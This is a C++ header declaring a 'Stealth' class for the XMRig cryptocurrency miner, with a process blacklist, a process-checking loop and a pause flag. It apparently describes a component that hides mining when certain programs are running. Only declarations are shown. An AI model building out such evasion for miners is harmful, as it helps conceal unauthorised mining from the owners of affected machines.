#pragma once

#include <atomic>
#include <string>
#include <thread>
#include <vector>

namespace xmrig {

class Controller;

class Stealth {
public:
    Stealth(Controller *controller);
    ~Stealth();

    void start();
    void stop();

private:
    void mainLoop();
    void checkProcesses();

    Controller *m_controller;
    std::atomic<bool> m_running;
    std::thread *m_thread = nullptr;
    std::vector<std::string> m_blacklist;
    bool m_paused = false;
};

} // namespace xmrig
